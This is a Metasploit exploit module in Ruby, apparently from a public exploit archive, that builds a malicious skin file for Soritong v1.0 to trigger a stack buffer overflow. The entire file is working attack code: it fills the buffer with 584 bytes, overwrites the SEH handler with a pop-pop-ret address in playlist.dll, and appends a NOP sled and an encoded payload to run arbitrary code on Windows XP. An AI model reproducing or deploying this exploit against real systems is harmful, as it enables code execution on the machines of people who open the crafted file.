##
#Metasploit version by FB1h2s,Orginal exploit by skull_haxor 
#And greetz to corelanc0d3r team for all there cool tutorials, #espesialy the Unicode one :)
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of #use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Soritong v1.0 Universal BOF-SEH (META)',
            'Description' => %q{
                This module exploits a stack overflow in Soritong v1.0 
            By creating a specially crafted skin ui file making it possible to execute arbitrary code.
            Just replace the skin file with the new one.
            },
            'License' => MSF_LICENSE,
            'Author' => 'FB1H2S',
            'Version' => 'Version 1',
            'References' =>
                [
                    [ 'OSVDB', '' ],
                    [ 'URL', 'http://www.exploit-db.com/exploits/8624' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload' =>
                {
                    'Space' => 1000,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'StackAdjustment' => -3500,
                    'DisableNops' => 'True',
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP Universal', { 'Ret' => 0x1001E812} ], # pop pop ret - playlist.dll
 
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'ui.txt']),
            ], self.class)
    end
 
 
    def exploit
 
        sploit = "A"*584
        sploit << "\xeb\x06\x90\x90"            # short jump 6 bytes
        sploit << [target.ret].pack('V')      #universal
        sploit << "\x90" * 20                # nop sled
        sploit << payload.encoded
        sploit << "\x90" * 1000              #nd another few
 
        playlist = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(playlist)
 
    end
 
end